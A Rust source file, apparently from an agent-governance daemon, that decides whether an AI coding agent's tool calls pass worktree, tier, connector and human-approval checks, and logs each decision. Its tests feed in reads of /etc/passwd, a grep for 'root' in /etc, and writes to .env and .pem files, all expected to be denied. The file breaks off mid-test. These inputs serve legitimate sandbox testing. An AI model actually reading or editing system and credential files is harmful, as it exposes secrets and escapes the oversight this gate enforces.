//! The hooks Claude Code runs around every tool call, answered: `PreToolUse` gets allow or deny
//! with a reason, and both leave the log's record of tool use (`docs/SPEC.md` 5.6, 8.2).

use std::collections::BTreeSet;
use std::path::{Component, Path, PathBuf};

use farik_core::contract::Role;
use farik_core::governor::permissions::{
    AgentGrants, ApprovalKey, ConnectorRefusal, ConnectorTag, PermissionTier, ToolCallContext,
    ToolCallRequest, ToolDescriptor, evaluate_connector_call, evaluate_tool_call, input_sha256,
};
use farik_core::team::{AgentStatus, Team};
use farik_protocol::event::{
    ConnectorTagWire, EventBody, EventIds, EventKind, ToolApprovalRequestedBody, ToolCalledBody,
    ToolDeniedBody, ToolReturnedBody, new_event,
};
use farik_store::EventQuery;
use farik_store::waiting::open_grants;
use serde::{Deserialize, Serialize, Serializer};
use serde_json::{Value, json};

use super::{DaemonError, DaemonState, SessionRegistration};
use crate::allowances::allowance_period;
use crate::tools::design::design_plan_gate;
use crate::tools::refusal::Refusal;
use crate::tools::{ToolDeps, ToolError, paths_of, tool_descriptors};

/// What Claude Code sends a hook on its standard input, the fields Farik reads.
#[derive(Debug, Clone, PartialEq, Deserialize)]
pub struct HookRequest {
    /// The `--session-id` Farik started the session with.
    pub session_id: String,
    /// The directory the session runs in, as Claude Code reports it.
    pub cwd: PathBuf,
    /// `PreToolUse` or `PostToolUse`.
    pub hook_event_name: String,
    /// The tool called: a built-in's name, or `mcp__<server>__<tool>`.
    pub tool_name: String,
    /// The call's input.
    pub tool_input: Value,
    /// The call's id, which pairs a `PreToolUse` with its `PostToolUse`.
    pub tool_use_id: Option<String>,
    /// What the tool returned, on a `PostToolUse`.
    pub tool_response: Option<Value>,
    /// How long it took, on a `PostToolUse`.
    pub duration_ms: Option<u64>,
}

/// The answer to a `PreToolUse` hook.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct HookDecision {
    /// Whether the call may go ahead.
    pub allow: bool,
    /// Why; for a deny, the refusal's kind in `snake_case`, then `: `, then what it says.
    pub reason: String,
}

impl HookDecision {
    fn deny(reason: String) -> Self {
        Self {
            allow: false,
            reason,
        }
    }
}

/// Claude Code's `hookSpecificOutput` shape, which is its format and not Farik's.
impl Serialize for HookDecision {
    fn serialize<S: Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        json!({
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": if self.allow { "allow" } else { "deny" },
                "permissionDecisionReason": self.reason,
            }
        })
        .serialize(serializer)
    }
}

/// How much of a call's input or output the log keeps.
const RECORD_LIMIT_BYTES: usize = 4_096;
/// What ends a value the log kept only part of.
const CUT_MARKER: &str = "[cut at 4 KiB]";
/// Claude Code's tool for loading a skill.
const SKILL_TOOL: &str = "Skill";
/// The prefix Claude Code gives the tools of Farik's own MCP server.
const FARIK_PREFIX: &str = "mcp__farik__";
/// The largest integer a JSON number holds exactly, and the schema's ceiling for one.
const JSON_SAFE_INTEGER: u64 = 9_007_199_254_740_991;
/// Why an allowed call was allowed.
const ALLOWED: &str = "allowed by the governor";
/// The kind of the denial of every call of a session told to stop.
const SESSION_STOPPED: &str = "session_stopped";
/// The kind of the denial of a connector's call that waits for the human, and the start of the
/// stop and the end's detail it gives its session (ADR 0031).
pub(crate) const APPROVAL_NEEDED: &str = "approval_needed";

/// The tier a Claude Code built-in tool needs, or `None` for one no session may call: `Bash`
/// above all, because a session's shell is `farik_exec` (ADR 0004).
#[must_use]
pub fn builtin_tool_tier(tool: &str) -> Option<PermissionTier> {
    match tool {
        // `ToolSearch` only lists tools, and may be how Claude Code reaches Farik's.
        "Read" | "Glob" | "Grep" | "LS" | "ToolSearch" => Some(PermissionTier::Read),
        "Edit" | "Write" | "MultiEdit" | "NotebookEdit" => Some(PermissionTier::WriteWorkspace),
        "WebFetch" | "WebSearch" => Some(PermissionTier::Network),
        _ => None,
    }
}

/// Decides one `PreToolUse` hook and records the decision, `tool.called` or `tool.denied`. It
/// refuses, in this order: a session the daemon does not know (`unknown_session`); an agent that
/// is not active (`agent_not_active`); a session at its `max_tool_calls` (`tool_call_limit`); a
/// `Skill` call that is not `farik:<name>` of one of the session's skills (`skill_not_in_session`); a
/// tool that is neither Farik's nor a built-in with a tier (`tool_not_allowed`); a Farik tool the
/// session was not given (`tool_not_in_session`); a built-in's path
/// outside the session's worktree (`path_outside_workspace`); and whatever `evaluate_tool_call`
/// refuses. A decision the log cannot record is a deny (`record_failed`). Only an allowed call
/// counts towards the limit, and the count is checked and raised under one lock, because Claude
/// Code runs read tools in parallel.
#[must_use]
pub fn decide_pre_tool_use(request: &HookRequest, state: &DaemonState) -> HookDecision {
    let Some(deps) = state.deps() else {
        return HookDecision::deny(format!("no_project: {}", super::NO_PROJECT));
    };
    let mut sessions = state.sessions();
    let Some(session) = sessions.get_mut(&request.session_id) else {
        let reason = format!(
            "unknown_session: the daemon answers for no session {}",
            request.session_id
        );
        let ids = EventIds {
            session_id: Some(request.session_id.clone()),
            ..deps.ids.clone()
        };
        return record_decision(deps, ids, request, None, Err(reason));
    };
    let verdict = match &session.stop_reason {
        Some(reason) => Err(Denial::from(format!("{SESSION_STOPPED}: {reason}"))),
        None => judge(
            request,
            &session.registration,
            session.tool_calls,
            deps,
            state,
        ),
    };
    let verdict = verdict.map_err(|denial| {
        if let Some(stop) = denial.stop {
            session.stop_reason.get_or_insert(stop);
            state.stops().notify_waiters();
        }
        denial.reason
    });
    let connector = connector_of(request, &session.registration);
    // A connector call that used a grant or an allowance is one more of the agent's this period.
    let counted = verdict
        .as_ref()
        .ok()
        .filter(|pass| pass.approval.is_some() || pass.allowance.is_some())
        .and(connector_tool(&request.tool_name));
    let decision = record_decision(
        deps,
        ids_of(deps, &session.registration),
        request,
        connector,
        verdict,
    );
    if decision.allow {
        session.tool_calls += 1;
        if let Some((server, tool)) = counted {
            state
                .allowance_counts()
                .raise(&session.registration.agent_id, server, tool);
        }
    }
    decision
}

/// What let a call through, beyond that it was allowed: the human's grant it uses up, or the
/// allowance it ran inside (ADR 0037).
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
struct Pass {
    approval: Option<u64>,
    allowance: Option<u32>,
}

/// Why a call is denied, and the stop the denial asks of the session when it asks one: an agent
/// the human paused or retired stops at its next tool call (F1), and a call that waits for the
/// human ends its session (ADR 0031).
struct Denial {
    reason: String,
    stop: Option<String>,
}

impl From<String> for Denial {
    fn from(reason: String) -> Self {
        Self { reason, stop: None }
    }
}

/// Records one `PostToolUse` hook as `tool.returned`, its output cut at 4 KiB.
///
/// # Errors
///
/// `Io` when the log does not take the event.
pub fn record_post_tool_use(request: &HookRequest, state: &DaemonState) -> Result<(), DaemonError> {
    let Some(deps) = state.deps() else {
        return Err(DaemonError::Io {
            detail: super::NO_PROJECT.to_string(),
        });
    };
    let ids = state.sessions().get(&request.session_id).map_or_else(
        || EventIds {
            session_id: Some(request.session_id.clone()),
            ..deps.ids.clone()
        },
        |session| ids_of(deps, &session.registration),
    );
    let output = request
        .tool_response
        .as_ref()
        .map_or_else(String::new, |response| cut(response.to_string()));
    append(
        deps,
        ids,
        EventBody::ToolReturned(ToolReturnedBody {
            tool: request.tool_name.clone(),
            tool_use_id: request.tool_use_id.clone(),
            output,
            // The schema's ceiling is the largest integer JSON holds exactly.
            duration_ms: request
                .duration_ms
                .and_then(|ms| i64::try_from(ms.min(JSON_SAFE_INTEGER)).ok()),
        }),
    )
    .map(|_| ())
    .map_err(|detail| DaemonError::Io { detail })
}

/// Whether the call may go ahead, or why it may not.
fn judge(
    request: &HookRequest,
    registration: &SessionRegistration,
    tool_calls: u32,
    deps: &ToolDeps,
    state: &DaemonState,
) -> Result<Pass, Denial> {
    let team = deps
        .files
        .read_team()
        .map_err(|error| Denial::from(format!("team_unreadable: {error}")))?;
    match team
        .agents
        .iter()
        .find(|agent| agent.id.as_str() == registration.agent_id)
    {
        Some(agent) if crate::tools::may_work(agent.status, registration.purpose) => {}
        found => {
            let status = found.map(|agent| agent.status);
            return Err(Denial {
                reason: Refusal::AgentNotActive {
                    agent_id: registration.agent_id.clone(),
                    status,
                }
                .reason(),
                stop: Some(
                    if status == Some(AgentStatus::Paused) {
                        "agent paused by the user"
                    } else {
                        "agent retired by the user"
                    }
                    .to_string(),
                ),
            });
        }
    }
    if tool_calls >= registration.limits.max_tool_calls {
        return Err(Denial::from(format!(
            "tool_call_limit: the session has made the {} tool calls it may make",
            registration.limits.max_tool_calls
        )));
    }
    // A skill is loaded by name, which is no tier's business (ADR 0034).
    if request.tool_name == SKILL_TOOL {
        return judge_skill(&request.tool_input, registration)
            .map(|()| Pass::default())
            .map_err(Denial::from);
    }
    // A connector's call is judged by its tag alone, whatever the session's tiers (5.6).
    if !request.tool_name.starts_with(FARIK_PREFIX) && connector_tool(&request.tool_name).is_some()
    {
        return judge_connector(request, registration, deps, state, &team);
    }
    judge_call(request, registration, deps, &team)
        .map(|()| Pass::default())
        .map_err(Denial::from)
}

/// Whether an active agent's call of a Farik tool or a built-in may go ahead, or the reason it may
/// not: by the tiers the session started with (spec 4.4).
fn judge_call(
    request: &HookRequest,
    registration: &SessionRegistration,
    deps: &ToolDeps,
    team: &Team,
) -> Result<(), String> {
    let (tier, paths) = match request.tool_name.strip_prefix(FARIK_PREFIX) {
        // A Farik tool is asked with the paths its input names, as `call_tool` asks again: a
        // `write_workspace` call with none is refused.
        Some(name) => match tool_descriptors().iter().find(|tool| tool.name == name) {
            Some(_) if !registration.farik_tools.iter().any(|given| given == name) => {
                return Err(Refusal::ToolNotInSession {
                    tool: name.to_string(),
                }
                .reason());
            }
            Some(tool) => (tool.tier, paths_of(name, &request.tool_input)),
            None => return Err(not_allowed(&request.tool_name)),
        },
        None => match builtin_tool_tier(&request.tool_name) {
            // The skills' folder is outside the worktree, and a read there asks about no path.
            Some(tier) if in_skill_folder(request, registration) => (tier, Vec::new()),
            Some(tier) => (
                tier,
                workspace_paths(&request.tool_name, &request.tool_input, &registration.cwd)?,
            ),
            None => return Err(not_allowed(&request.tool_name)),
        },
    };
    let allowed_paths = match &registration.task_id {
        Some(task) => deps
            .files
            .read_contract(task)
            .map_err(|error| format!("contract_unreadable: {error}"))?
            .allowed_paths
            .iter()
            .map(ToString::to_string)
            .collect(),
        None => Vec::new(),
    };
    evaluate_tool_call(
        &ToolCallRequest {
            tool: ToolDescriptor {
                name: request.tool_name.clone(),
                tier,
            },
            paths,
            input_hash: String::new(),
        },
        &AgentGrants {
            tiers: registration.tiers.iter().copied().collect::<BTreeSet<_>>(),
            preauthorized_external_tools: BTreeSet::new(),
        },
        &ToolCallContext {
            allowed_paths,
            protected_paths: team.rules().protected_paths,
            approved_calls: Vec::new(),
        },
    )
    .map_err(|refusal| Refusal::Tool(refusal).reason())?;
    plan_gate(deps, team, registration, tier)
}

/// Whether a `Skill` call names one of the session's skills as `farik:<name>` and holds nothing
/// but that and an optional string `args` holding no `@`, which Claude Code would attach as a file
/// past this hook (ADR 0034): a bare name would load Claude Code's own
/// skill of that name, and any other field is not one Farik has judged.
fn judge_skill(input: &Value, registration: &SessionRegistration) -> Result<(), String> {
    let named = input.as_object().is_some_and(|fields| {
        fields.keys().all(|key| key == "skill" || key == "args")
            && fields
                .get("args")
                .is_none_or(|args| args.as_str().is_some_and(|text| !text.contains('@')))
            && fields
                .get("skill")
                .and_then(Value::as_str)
                .and_then(|skill| skill.strip_prefix("farik:"))
                .is_some_and(|name| registration.skills.iter().any(|given| given == name))
    });
    if named {
        return Ok(());
    }
    Err(format!(
        "skill_not_in_session: a session uses its own skills as farik:<name> with nothing but an \
         optional args without @, and this one has {}",
        if registration.skills.is_empty() {
            "none".to_string()
        } else {
            registration.skills.join(", ")
        }
    ))
}

/// Whether a `Read`, `Glob` or `Grep` is of the session's skills folder, resolved through links:
/// the one place outside the worktree a session reads (ADR 0034). A `Glob` pattern stays
/// relative, as everywhere.
fn in_skill_folder(request: &HookRequest, registration: &SessionRegistration) -> bool {
    let Some(skills_root) = &registration.skills_root else {
        return false;
    };
    let field = match request.tool_name.as_str() {
        "Read" => "file_path",
        "Glob" | "Grep" => "path",
        _ => return false,
    };
    let Some(raw) = request.tool_input.get(field).and_then(Value::as_str) else {
        return false;
    };
    if request.tool_name == "Glob"
        && let Some(pattern) = request.tool_input.get("pattern").and_then(Value::as_str)
        && (Path::new(pattern).is_absolute()
            || parts(pattern).any(|part| part == "..")
            || expands_home(pattern))
    {
        return false;
    }
    if expands_home(raw) {
        return false;
    }
    match (
        skills_root.canonicalize(),
        resolve(&registration.cwd.join(raw)),
    ) {
        (Ok(root), Some(resolved)) => resolved.starts_with(root),
        _ => false,
    }
}

/// The Designer's plan gate (ADR 0026): before the Product Manager approves its plan, a Designer's
/// call at a writing tier, `external_effect` among them, is refused.
fn plan_gate(
    deps: &ToolDeps,
    team: &Team,
    registration: &SessionRegistration,
    tier: PermissionTier,
) -> Result<(), String> {
    let role = team
        .agents
        .iter()
        .find(|agent| agent.id.as_str() == registration.agent_id)
        .map_or(Role::Human, |agent| Role::from(agent.role));
    design_plan_gate(&deps.log, role, tier, registration.task_id.as_ref()).map_err(|error| {
        match error {
            ToolError::Refused { reason } => reason,
            other => format!("design_plan_unreadable: {other}"),
        }
    })
}

/// A connector's tool name, `mcp__<server>__<tool>`, as its server and its tool; `None` for any
/// other name. A server's name holds no `_` (the team file's rule), so the first `__` ends it.
/// Farik's own tools are told apart before this is asked.
fn connector_tool(name: &str) -> Option<(&str, &str)> {
    name.strip_prefix("mcp__")?.split_once("__")
}

/// The server and the tag a connector's call is recorded with: its server whenever the name is a
/// connector's, and its tag when the session's list of that server tags it.
fn connector_of(
    request: &HookRequest,
    registration: &SessionRegistration,
) -> Option<(String, Option<ConnectorTag>)> {
    let (server, tool) = connector_tool(&request.tool_name)?;
    let tag = registration
        .connectors
        .iter()
        .find(|connector| connector.server == server)
        .and_then(|connector| connector.tools.get(tool).copied());
    Some((server.to_string(), tag))
}

/// Whether a connector's call may go ahead, and the grant or allowance it uses, by
/// `evaluate_connector_call` (5.6): no tier is asked, and `preauthorized_external_tools` is never
/// consulted. An `external_effect` call meets the Designer's plan gate first, then the human's open
/// grant for it is looked up, then, with none, the agent's calls of the tool this period are
/// counted against its allowance; with neither, it asks (ADR 0031, ADR 0037). The caller holds the
/// sessions lock, so the count and the call it allows are one step.
fn judge_connector(
    request: &HookRequest,
    registration: &SessionRegistration,
    deps: &ToolDeps,
    state: &DaemonState,
    team: &Team,
) -> Result<Pass, Denial> {
    let Some((server, tool)) = connector_tool(&request.tool_name) else {
        return Err(Denial::from(not_allowed(&request.tool_name)));
    };
    let connector = registration
        .connectors
        .iter()
        .find(|connector| connector.server == server);
    let mut granted = None;
    let mut used = 0;
    if connector.and_then(|connector| connector.tools.get(tool))
        == Some(&ConnectorTag::ExternalEffect)
    {
        plan_gate(deps, team, registration, PermissionTier::ExternalEffect)?;
        granted = grant_for(deps, registration, server, tool, &request.tool_input)?;
        // Zero asks every time, and a grant is used before an allowance: neither needs the count.
        if granted.is_none()
            && connector
                .and_then(|connector| connector.allowances.get(tool))
                .is_some_and(|calls| *calls > 0)
        {
            used = calls_made(deps, state, &registration.agent_id, server, tool)?;
        }
    }
    // Until the plan's gate is read here, no plan is active: a marked tool is refused.
    match evaluate_connector_call(tool, &request.tool_input, connector, granted, used, false) {
        Ok(pass) => Ok(Pass {
            approval: pass.approval,
            allowance: pass.allowance,
        }),
        Err(ConnectorRefusal::ApprovalNeeded) => {
            Err(ask(deps, registration, server, tool, &request.tool_input))
        }
        Err(refusal) => Err(Denial::from(match refusal {
            ConnectorRefusal::ConnectorNotInSession => format!(
                "connector_not_in_session: {server} is not a connector this session was given"
            ),
            ConnectorRefusal::ToolNotTagged => format!(
                "tool_not_tagged: {tool} is not in {server}'s pinned list of tools, so it is not \
                 offered"
            ),
            ConnectorRefusal::ToolDenied => format!(
                "tool_denied: {tool} of {server} is tagged denied, and no session may call it"
            ),
            ConnectorRefusal::ApprovalNeeded => unreachable!("asked above"),
            ConnectorRefusal::NoActivePlan => format!(
                "no_active_marketing_plan: {tool} of {server} runs only inside a marketing plan \
                 the owner approved"
            ),
            ConnectorRefusal::InputTooLarge => format!(
                "tool_input_too_large: {tool}'s input is over 64 KiB, too long to show you, so it \
                 is refused"
            ),
            ConnectorRefusal::UrlOutsidePreview { url } => format!(
                "url_outside_preview: {url} is not the project's preview; open pages under {}",
                connector
                    .and_then(|connector| connector.origin.as_deref())
                    .unwrap_or_default()
            ),
        })),
    }
}

/// The calls `agent` has made of `tool` of `server` this period, from the daemon's counts.
fn calls_made(
    deps: &ToolDeps,
    state: &DaemonState,
    agent: &str,
    server: &str,
    tool: &str,
) -> Result<u32, Denial> {
    let unreadable =
        |error: farik_store::StoreError| Denial::from(format!("allowance_unreadable: {error}"));
    let period =
        allowance_period(&deps.log, &deps.projections, deps.clock.now()).map_err(unreadable)?;
    state
        .allowance_counts()
        .used(&deps.log, &period, agent, server, tool)
        .map_err(unreadable)
}

/// The open grant this session may use for this exact call: the human's, for the session's agent
/// and task, server, tool and input, granted before this session started. Only the task's events
/// are read, so the sessions lock the caller holds stays short.
fn grant_for(
    deps: &ToolDeps,
    registration: &SessionRegistration,
    server: &str,
    tool: &str,
    input: &Value,
) -> Result<Option<u64>, Denial> {
    let Some(task_id) = &registration.task_id else {
        return Ok(None);
    };
    let events = deps
        .log
        .read(&EventQuery {
            task_id: Some(task_id.clone()),
            kinds: vec![
                EventKind::ToolApprovalRequested,
                EventKind::ToolApprovalGranted,
                EventKind::ToolApprovalRefused,
                EventKind::ToolCalled,
                EventKind::SessionStarted,
                EventKind::SessionEnded,
            ],
            ..EventQuery::default()
        })
        .map_err(|error| Denial::from(format!("grants_unreadable: {error}")))?;
    // The latest start of this session's id: an id is never given twice, and if it were, the
    // session running now is the last one started under it.
    let Some(started) = events
        .iter()
        .rev()
        .find(|event| {
            matches!(event.body, EventBody::SessionStarted(_))
                && event.envelope.ids.session_id.as_deref() == Some(&registration.session_id)
        })
        .map(|event| event.envelope.seq)
    else {
        return Ok(None);
    };
    let key = ApprovalKey {
        agent_id: registration.agent_id.clone(),
        task_id: task_id.clone(),
        server: server.to_string(),
        tool: tool.to_string(),
        input_sha256: input_sha256(input),
    };
    Ok(open_grants(&events)
        .into_iter()
        .find(|grant| grant.key == key && grant.granted_at < started)
        .map(|grant| grant.approval))
}

/// Records that the call waits for the human, `tool_approval.requested` with its whole input, and
/// the denial that names its seq and stops the session. A session about no task has nothing to
/// wait on, so its call is refused without asking.
fn ask(
    deps: &ToolDeps,
    registration: &SessionRegistration,
    server: &str,
    tool: &str,
    input: &Value,
) -> Denial {
    if registration.task_id.is_none() {
        return Denial::from(format!(
            "external_effect_refused: {tool} of {server} changes something outside the sandbox, \
             and only a session about a task can ask you to allow it"
        ));
    }
    // The connector's own checks passed, so neither name is empty; a panic here would poison the
    // sessions lock, so a body that cannot be made is a failed record instead.
    let requested = (|| {
        Some(EventBody::ToolApprovalRequested(
            ToolApprovalRequestedBody {
                server: server.to_string().try_into().ok()?,
                tool: tool.to_string().try_into().ok()?,
                input: input.to_string(),
                input_sha256: input_sha256(input).try_into().ok()?,
            },
        ))
    })()
    .ok_or_else(|| format!("{server} {tool} cannot be named in a request"));
    match requested.and_then(|body| append(deps, ids_of(deps, registration), body)) {
        Ok(seq) => Denial {
            reason: format!(
                "{APPROVAL_NEEDED}: {server} {tool} waits for the human (approval {seq})"
            ),
            stop: Some(format!("{APPROVAL_NEEDED}: approval {seq}")),
        },
        Err(detail) => Denial::from(format!("record_failed: {detail}")),
    }
}

fn not_allowed(tool: &str) -> String {
    format!(
        "tool_not_allowed: {tool} is neither a Farik tool nor a built-in tool with a tier, and no \
         other tool is served to a session"
    )
}

/// The paths a built-in's call touches, relative to the session's worktree. The path and the
/// worktree are both resolved through symlinks, so that a committed link out of the worktree is
/// judged by where it points; one outside the worktree is refused, reads included, because a
/// session's files are its worktree's and nothing else on the machine (spec 8.6). The worktree
/// itself, and a search with no path, contribute none.
fn workspace_paths(tool: &str, input: &Value, cwd: &Path) -> Result<Vec<String>, String> {
    if tool == "Glob"
        && let Some(pattern) = input.get("pattern").and_then(Value::as_str)
        && (Path::new(pattern).is_absolute()
            || parts(pattern).any(|part| part == "..")
            || expands_home(pattern))
    {
        return Err(outside(pattern));
    }
    let field = match tool {
        "Read" | "Write" | "Edit" | "MultiEdit" => "file_path",
        "NotebookEdit" => "notebook_path",
        "Glob" | "Grep" | "LS" => "path",
        _ => return Ok(Vec::new()),
    };
    let Some(raw) = input.get(field).and_then(Value::as_str) else {
        return Ok(Vec::new());
    };
    if expands_home(raw) {
        return Err(outside(raw));
    }
    let root = cwd.canonicalize().map_err(|error| {
        format!(
            "path_outside_workspace: the session's worktree {} cannot be resolved: {error}",
            cwd.display()
        )
    })?;
    let resolved = resolve(&cwd.join(raw)).ok_or_else(|| outside(raw))?;
    let relative = resolved.strip_prefix(&root).map_err(|_| outside(raw))?;
    if relative.as_os_str().is_empty() {
        return Ok(Vec::new());
    }
    Ok(vec![
        relative
            .components()
            .map(|part| part.as_os_str().to_string_lossy())
            .collect::<Vec<_>>()
            .join("/"),
    ])
}

/// A path's or a pattern's parts, split at either separator.
fn parts(path: &str) -> impl Iterator<Item = &str> {
    path.split(['/', '\\'])
}

/// Whether a part of `path` starts with `~`: Claude Code expands a leading `~` or `~user` to a
/// home directory before the tool runs, so the path the hook would judge, under the worktree, is
/// not the one the tool touches. Every such part is refused, not only a leading one, because a
/// file whose name starts with `~` is never worth the doubt.
fn expands_home(path: &str) -> bool {
    parts(path).any(|part| part.starts_with('~'))
}

/// `path` through its symlinks: its nearest existing ancestor canonicalised, and the rest, which
/// does not exist yet, appended. `None` when the rest climbs with `..`, which nothing that does
/// not exist can be resolved through.
fn resolve(path: &Path) -> Option<PathBuf> {
    path.ancestors().find_map(|ancestor| {
        let existing = ancestor.canonicalize().ok()?;
        let rest = path.strip_prefix(ancestor).ok()?;
        rest.components()
            .all(|part| matches!(part, Component::Normal(_)))
            .then(|| existing.join(rest))
    })
}

fn outside(path: &str) -> String {
    format!("path_outside_workspace: {path} is outside the session's worktree")
}

/// The ids a session's events carry: its agent, itself, and its task.
fn ids_of(deps: &ToolDeps, registration: &SessionRegistration) -> EventIds {
    EventIds {
        task_id: registration.task_id.clone(),
        agent_id: Some(registration.agent_id.clone()),
        session_id: Some(registration.session_id.clone()),
        ..deps.ids.clone()
    }
}

/// Records a verdict and answers with it, or with `record_failed` when the log would not take it.
fn record_decision(
    deps: &ToolDeps,
    ids: EventIds,
    request: &HookRequest,
    connector: Option<(String, Option<ConnectorTag>)>,
    verdict: Result<Pass, String>,
) -> HookDecision {
    let (server, tag) = match connector {
        Some((server, tag)) => (Some(server), tag.map(tag_wire)),
        None => (None, None),
    };
    let tool = request.tool_name.clone();
    let tool_use_id = request.tool_use_id.clone();
    let (body, decision) = match verdict {
        Ok(pass) => (
            EventBody::ToolCalled(ToolCalledBody {
                tool,
                tool_use_id,
                input: cut(request.tool_input.to_string()),
                server: server.and_then(|name| name.try_into().ok()),
                tag,
                approval: pass.approval.and_then(std::num::NonZeroU64::new),
                allowance: pass
                    .allowance
                    .and_then(|calls| std::num::NonZeroU64::new(u64::from(calls))),
            }),
            HookDecision {
                allow: true,
                reason: ALLOWED.to_string(),
            },
        ),
        Err(reason) => (
            EventBody::ToolDenied(ToolDeniedBody {
                tool,
                tool_use_id,
                reason: reason.clone(),
                server: server.and_then(|name| name.try_into().ok()),
                tag,
            }),
            HookDecision::deny(reason),
        ),
    };
    match append(deps, ids, body) {
        Ok(_) => decision,
        Err(detail) => HookDecision::deny(format!("record_failed: {detail}")),
    }
}

fn tag_wire(tag: ConnectorTag) -> ConnectorTagWire {
    match tag {
        ConnectorTag::Network => ConnectorTagWire::Network,
        ConnectorTag::ExternalEffect => ConnectorTagWire::ExternalEffect,
        ConnectorTag::Denied => ConnectorTagWire::Denied,
    }
}

/// Appends one event and projects it: the seq it was written at.
fn append(deps: &ToolDeps, ids: EventIds, body: EventBody) -> Result<u64, String> {
    let event = new_event(body, deps.clock.now(), ids)
        .map_err(|error| format!("the event cannot be stamped: {error:?}"))?;
    let appended = deps.log.append(&event).map_err(|error| error.to_string())?;
    deps.projections
        .apply(&appended)
        .map_err(|error| error.to_string())?;
    Ok(appended.envelope.seq)
}

/// `text` whole when it fits in 4 KiB, or cut at the last character boundary that leaves room
/// for the marker, and the marker appended, so that what the log keeps is at most 4 KiB.
fn cut(text: String) -> String {
    if text.len() <= RECORD_LIMIT_BYTES {
        return text;
    }
    let mut end = RECORD_LIMIT_BYTES - CUT_MARKER.len();
    while !text.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}{CUT_MARKER}", &text[..end])
}

#[cfg(test)]
mod tests {
    use farik_core::budget::DEFAULT_SESSION_LIMITS;
    use farik_core::budget::SessionLimits;
    use farik_protocol::event::{EventBody, EventKind};
    use serde_json::{Value, json};

    use super::{HookDecision, HookRequest, cut, decide_pre_tool_use, record_post_tool_use};
    use crate::daemon::fixtures::{DEV_SESSION, POST_READ, PRE_READ, PRE_WRITE, TestDaemon};
    use crate::tools::fixtures::{a_team_of_three, at, with_the_designer};

    fn denied_for(decision: &HookDecision, kind: &str) {
        assert!(!decision.allow, "{decision:?}");
        assert!(
            decision.reason.starts_with(&format!("{kind}: ")),
            "{decision:?}"
        );
    }

    #[test]
    fn reads_the_hook_input_claude_code_sends() {
        for (fixture, tool, event) in [
            (PRE_READ, "Read", "PreToolUse"),
            (PRE_WRITE, "Write", "PreToolUse"),
            (POST_READ, "Read", "PostToolUse"),
        ] {
            let request: HookRequest =
                serde_json::from_str(fixture).expect("a recorded input reads");
            assert_eq!(request.tool_name, tool);
            assert_eq!(request.hook_event_name, event);
            assert_eq!(request.session_id, DEV_SESSION);
            assert!(
                request
                    .tool_use_id
                    .as_deref()
                    .is_some_and(|id| id.starts_with("toolu_")),
                "{request:?}"
            );
            assert_eq!(request.tool_response.is_some(), event == "PostToolUse");
        }
        let post: HookRequest = serde_json::from_str(POST_READ).expect("reads");
        assert_eq!(
            post.tool_response.expect("a response")["file"]["content"],
            json!("hello\n")
        );
        assert_eq!(post.duration_ms, Some(8));
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn allows_a_read_inside_the_worktree_and_records_it() {
        let daemon = TestDaemon::new("hook-read", |_| {});
        let decision = decide_pre_tool_use(
            &daemon.dev_call("Read", &json!({ "file_path": daemon.inside("src/a.rs") })),
            &daemon.state,
        );
        assert!(decision.allow, "{decision:?}");
        let called = daemon.events(EventKind::ToolCalled);
        assert_eq!(called.len(), 1);
        let ids = &called[0].envelope.ids;
        assert_eq!(ids.session_id.as_deref(), Some(DEV_SESSION));
        assert_eq!(ids.agent_id.as_deref(), Some("dev-a"));
        assert_eq!(
            ids.task_id.as_ref().map(|id| id.to_string()).as_deref(),
            Some("FRK-1")
        );
        let EventBody::ToolCalled(body) = &called[0].body else {
            panic!("a tool.called event carries a tool.called body");
        };
        assert_eq!(body.tool, "Read");
        assert!(body.input.contains("src/a.rs"), "{}", body.input);
        assert!(daemon.events(EventKind::ToolDenied).is_empty());
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_a_read_outside_the_worktree() {
        let daemon = TestDaemon::new("hook-outside", |_| {});
        let decision = decide_pre_tool_use(
            &daemon.dev_call("Read", &json!({ "file_path": "/etc/passwd" })),
            &daemon.state,
        );
        denied_for(&decision, "path_outside_workspace");
        let denied = daemon.events(EventKind::ToolDenied);
        assert_eq!(denied.len(), 1);
        let EventBody::ToolDenied(body) = &denied[0].body else {
            panic!("a tool.denied event carries a tool.denied body");
        };
        assert_eq!(body.reason, decision.reason);
        assert!(daemon.events(EventKind::ToolCalled).is_empty());
        for (tool, input) in [
            ("Grep", json!({ "pattern": "root", "path": "/etc" })),
            ("LS", json!({ "path": "/etc" })),
            (
                "MultiEdit",
                json!({ "file_path": "/etc/passwd", "edits": [{ "old_string": "a", "new_string": "b" }] }),
            ),
            (
                "NotebookEdit",
                json!({ "notebook_path": "/etc/n.ipynb", "new_source": "" }),
            ),
        ] {
            let decision = decide_pre_tool_use(&daemon.dev_call(tool, &input), &daemon.state);
            assert!(!decision.allow, "{tool}: {decision:?}");
            denied_for(&decision, "path_outside_workspace");
        }
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_a_read_and_a_write_of_a_protected_path() {
        let daemon = TestDaemon::new("hook-protected", |_| {});
        for (tool, input) in [
            ("Read", json!({ "file_path": daemon.inside(".env") })),
            (
                "Write",
                json!({ "file_path": daemon.inside(".env"), "content": "KEY=1" }),
            ),
            (
                "Write",
                json!({ "file_path": daemon.inside("src/server.pem"), "content": "" }),
            ),
        ] {
            let decision = decide_pre_tool_use(&daemon.dev_call(tool, &input), &daemon.state);
            assert!(!decision.allow, "{tool} {input}: {decision:?}");
            denied_for(&decision, "path_protected");
        }
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn records_a_tool_call_s_input_cut_at_four_kib() {
        let daemon = TestDaemon::new("hook-input", |_| {});
        let decision = decide_pre_tool_use(
            &daemon.dev_call(
                "Write",
                &json!({ "file_path": daemon.inside("src/a.rs"), "content": "x".repeat(10_000) }),
            ),
            &daemon.state,
        );
        assert!(decision.allow, "{decision:?}");
        let called = daemon.events(EventKind::ToolCalled);
        assert_eq!(called.len(), 1);
        let EventBody::ToolCalled(body) = &called[0].body else {
            panic!("a tool.called event carries a tool.called body");
        };
        assert!(body.input.len() <= 4_096, "{}", body.input.len());
        assert!(body.input.ends_with("[cut at 4 KiB]"), "{}", body.input);
    }

    #[test]
